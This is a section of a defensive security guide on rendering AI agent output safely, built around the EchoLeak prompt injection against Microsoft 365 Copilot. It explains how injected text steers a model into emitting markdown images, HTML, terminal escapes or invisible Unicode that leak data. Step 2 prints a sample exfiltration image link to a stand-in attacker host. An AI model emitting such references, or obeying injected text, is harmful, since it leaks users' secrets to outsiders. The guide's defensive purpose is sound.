@@ -1,0 +1,110 @@
+<section class="phase">
+  <div class="phase-num">S13</div>
+  <div class="week">Operation · Safety, Alignment &amp; Agentic Security</div>
+  <h2>Rendering agent output safely: the last hop is the one you forgot to threat-model.</h2>
+  <p class="goal">EchoLeak (CVE-2025-32711) exfiltrated data out of Microsoft 365 Copilot with no click, no tool call and no outbound request by the agent — the model was steered into writing a markdown image, and the victim's client fetched it. That is the whole shape of the problem: your agent's output is attacker-influenced input to whatever displays it, the renderer is a network client you did not audit, and every egress control you built sits upstream of the hop that actually leaks.</p>
+
+  <div class="step">
+    <div class="step-num">STEP 1</div>
+    <h3>Model output is not your data. It is untrusted input wearing your logo.</h3>
+
+    <p>Teams sanitise what goes <em>into</em> the model and trust what comes out, because our system produced it. That inversion is the root cause of nearly every exfiltration in this class.</p>
+
+    <ul>
+      <li><strong>The output is downstream of everything the agent read.</strong> A web page, a PDF, an email, a retrieved chunk, a tool result, another agent's message — any of these can steer generation. The model is not the adversary; it is the compiler that turns the adversary's text into a payload in your output format. This is <a class="xref" href="/operations/safety-and-security/prompt-injection">prompt injection</a> arriving at its destination.</li>
+      <li><strong>The renderer executes.</strong> Markdown fetches. HTML runs. Terminals interpret. A "display layer" that resolves remote references is an HTTP client the agent can address by writing text, and text is the one thing the model is guaranteed to control.</li>
+      <li><strong>It defeats the boundary you actually built.</strong> <a class="xref" href="/operations/safety-and-security/egress-control-for-agents">Egress control</a> constrains the sandbox. The rendered response leaves from the user's browser, the chat client's unfurl service, or the terminal — none of which route through your proxy. A perfectly firewalled agent still leaks here, which is exactly why this step is worth its own control.</li>
+      <li><strong>The user is not a check.</strong> EchoLeak needed no interaction: reference-style markdown evaded link redaction, the image was auto-prefetched, and a Teams proxy already on the content-security-policy allowlist carried the request. Nobody clicked anything.</li>
+    </ul>
+
+    <div class="callout">
+      <p>Write the rule down in one line and put it on the render tier, not in a policy document: <strong>output is untrusted until it has passed the same allowlist you would apply to a stranger's HTML.</strong> Every step below is an application of it.</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 2</div>
+    <h3>Markdown is a network client, and it is the default output format.</h3>
+
+    <p>Almost every agent emits markdown, and almost every markdown renderer resolves remote references without asking. That combination is the single most exploited channel in this category.</p>
+
+    <ul>
+      <li><strong>An image reference is an unauthenticated GET the model composes.</strong> <code class="inline">![](https://attacker.example/x?d=SECRET)</code> needs no tool, no click and no permission. The URL is hundreds of bytes wide — enough for a token, a customer record or a session cookie the agent had legitimate access to.</li>
+      <li><strong>Redaction of links does not cover references.</strong> EchoLeak specifically used reference-style markdown to slip past a filter that handled inline links. Any filter written against one syntax will be evaded by the other; markdown has several spellings for the same fetch.</li>
+      <li><strong>Your allowlist is somebody's open proxy.</strong> A permitted domain that will fetch or redirect on request — a corporate image proxy, a link unfurler, an analytics pixel endpoint, a URL shortener on a vendor domain — is an exfiltration channel that your policy explicitly approved. This is the same failure documented in <a class="xref" href="/operations/safety-and-security/data-exfiltration-risks">data exfiltration and tool misuse</a>, arriving through the UI instead of a tool.</li>
+      <li><strong>The fix is boring and complete: no remote references in rendered output.</strong> Strip image URLs that are not on a tiny list of assets you host, and render links as inert text plus a visible destination rather than an anchor the client may prefetch. If the product genuinely needs to show a remote image, fetch it server-side through your own proxy, strip the query string, and cache it — so the request carries nothing and comes from you.</li>
+    </ul>
+
+    <div class="callout">
+      <p>Test it the way an attacker would, not the way a linter would: put a canary secret in the agent's context, plant an injection in a retrieved document, and watch your own egress logs for a request carrying it. If no request appears, try the reference-style spelling, an HTML <code class="inline">&lt;img&gt;</code>, a CSS <code class="inline">url()</code>, and a favicon. One of them is usually still open.</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 3</div>
+    <h3>If you render HTML, allowlist — and know that most markdown libraries pass raw HTML through.</h3>
+
+    <p>The moment rich formatting is a requirement, you are running a sanitiser, and the two mistakes are choosing a denylist and forgetting that the markdown layer already let HTML in.</p>
+
+    <ul>
+      <li><strong>Raw HTML passthrough is on by default in a surprising number of renderers.</strong> Sanitising markdown syntax while the library happily emits an inline <code class="inline">&lt;img&gt;</code> or <code class="inline">&lt;iframe&gt;</code> from the same source is the most common version of this bug. Disable HTML at the parser, then sanitise anyway.</li>
+      <li><strong>Allowlist elements and attributes; never enumerate the bad ones.</strong> Permit a closed set of tags and a closed set of attributes on each. Denylists lose to the next syntax somebody discovers, and this is a domain where new spellings arrive constantly.</li>
+      <li><strong>Scheme-check every URL that survives.</strong> <code class="inline">javascript:</code>, <code class="inline">data:</code> and <code class="inline">blob:</code> are the obvious ones; relative URLs that resolve against your own origin are the subtle one, because they let output address your authenticated endpoints.</li>
+      <li><strong>SVG is a document format, not an image format.</strong> It carries scripts, external references and styles. If agent output can produce SVG, either rasterise it or treat it as HTML and sanitise it with the same allowlist.</li>
+      <li><strong>Set a content-security-policy on the surface that displays agent output</strong>, and read it as a scoping control rather than a fix — EchoLeak went <em>through</em> a CSP by using a host that was already permitted. CSP narrows the set of hosts an injection can reach; it does not decide whether a reference should have been rendered at all.</li>
+    </ul>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 4</div>
+    <h3>Non-browser renderers are worse, and nobody hardened them.</h3>
+
+    <p>The browser at least has a security model. The other four places agent output lands do not, and coding agents put output in all of them.</p>
+
+    <ul>
+      <li><strong>Terminals interpret escape sequences.</strong> A model that can print arbitrary bytes into a terminal can rewrite the line above, set the window title, emit a clickable hyperlink whose visible text disagrees with its target, or — where the terminal supports it — write the system clipboard. A CLI agent that streams raw tool output to the screen has handed the attacker a display primitive. Strip control characters from anything the agent did not generate under your own formatter.</li>
+      <li><strong>Chat platforms unfurl from their own servers.</strong> Post agent output containing a URL into Slack or Teams and the platform fetches it — from its infrastructure, not yours. That request is invisible to your egress proxy and unblockable by your network policy. Treat any chat surface as a renderer with an unstoppable fetch and never let unvalidated URLs reach it.</li>
+      <li><strong>Notebooks and rich consoles render HTML by design.</strong> A data-analysis agent whose output is displayed as rich media is running the browser case with none of the browser hardening.</li>
+      <li><strong>Email and PDF are renderers too.</strong> If an agent drafts a message that a human sends, remote images in that draft fetch on the recipient's machine and the exfiltration path now runs through your own customer.</li>
+    </ul>
+
+    <div class="callout">
+      <p>Enumerate your render surfaces on one page — web UI, mobile, CLI, chat integration, email, PDF export, notebook, webhook payload — and mark which one applies the sanitiser. In most systems the answer is "the web UI, and only the web UI", while four other surfaces render the same string.</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 5</div>
+    <h3>Invisible characters: the payload the human reviewer approves without seeing it.</h3>
+
+    <p>This is the step that survives every control above, because it does not need the renderer to fetch anything. It needs the text to look clean.</p>
+
+    <ul>
+      <li><strong>Unicode carries text that does not display.</strong> Tag-block code points, zero-width joiners and bidirectional overrides let a string render as innocuous prose while carrying instructions, hidden data, or a different logical order than the visual one. The reviewer approves what they can see.</li>
+      <li><strong>The channel is copy-paste, and it crosses the trust boundary.</strong> A human copies the agent's answer into a ticket, a commit message or another prompt; the invisible payload rides along and reaches a model that treats the ticket as trusted internal content. Your <a class="xref" href="/operations/safety-and-security/human-in-the-loop">human-in-the-loop</a> control is reviewing a rendering, not the bytes.</li>
+      <li><strong>Normalise on the way out, not on the way in.</strong> Apply Unicode normalisation, drop non-printing and formatting code points outside a small permitted set, and reject or flag bidirectional controls. Do it at the same choke point as the markdown stripping so there is one function to audit.</li>
+      <li><strong>Show reviewers the escaped form for anything that will act.</strong> If a human is approving a command, a URL, a query or a diff, render it in a monospaced, escaped view where every byte is visible. Approval of prettified text is not approval of the payload.</li>
+    </ul>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 6</div>
+    <h3>Downstream sinks are renderers, and one function should own all of them.</h3>
+
+    <p>Agent output rarely stops at a screen. It becomes a ticket body, a commit message, a database row, a document, a webhook — each of which is read later by a human or, increasingly, by another agent.</p>
+
+    <ul>
+      <li><strong>Writing output into a system another agent reads is how injection becomes persistent.</strong> The second agent has no way to know the ticket was authored by a model that was steered. This is the write-side of <a class="xref" href="/deep-dives/memory-and-context/memory-poisoning-defenses">memory poisoning</a>, and the same containment applies: mark provenance on the record, and never let a stored string re-enter a context window as trusted.</li>
+      <li><strong>One egress-formatting function, called on every path.</strong> Sanitisation implemented per surface will be complete on the surface someone tested and absent on the integration added last quarter. Make the sanitiser the only way to emit, and make bypassing it require deleting code rather than forgetting to add it.</li>
+      <li><strong>Keep the raw output, ship the cleaned one.</strong> Store what the model actually produced in the trace — you need it for incident analysis and for <a class="xref" href="/operations/evaluation-and-observability/tracing-and-observability">tracing</a> — and never render the raw form back into a tool that will display it.</li>
+      <li><strong>Alert on strip events, do not just strip silently.</strong> A stripped remote image, a rejected scheme or a dropped control character during a real run is high-signal evidence that an injection succeeded upstream, and it arrives before any damage. Route it into <a class="xref" href="/operations/agentops/incident-response-for-agents">incident response</a> with the trace attached.</li>
+      <li><strong>Add the canary to the regression suite.</strong> A planted-secret, planted-injection test that asserts no outbound request carries the canary belongs in CI next to your evals, per <a class="xref" href="/operations/evaluation-and-observability/eval-driven-agent-development">eval-driven development</a>. This control silently regresses whenever someone swaps a markdown library.</li>
+    </ul>
+
+    <div class="callout tip">
+      <p>Spend the first hour here: put a canary string in one agent's context, plant an injection in a document it retrieves, and see whether a request carrying that canary appears in any log you own. Then turn off remote image resolution in the renderer — that single change closes the channel that produced the only zero-click exfiltration this class has yet had in production, and no product requirement has ever depended on it. <strong>Every other control you have bounds what the agent can do; this one bounds what its words can do after it has stopped running.</strong></p>
+    </div>
+
+    <p>Related: <a class="xref" href="/operations/safety-and-security/prompt-injection">prompt injection</a> for the attack that arrives here, <a class="xref" href="/operations/safety-and-security/egress-control-for-agents">egress control</a> for the boundary this one sits outside, <a class="xref" href="/deep-dives/agent-security/prompt-injection-defense-2026">prompt-injection defense in 2026</a> for the layered picture, and <a class="xref" href="/operations/safety-and-security/agentic-threat-model">the agentic threat model</a> for where output rendering sits in it.</p>
+  </div>
+</section>
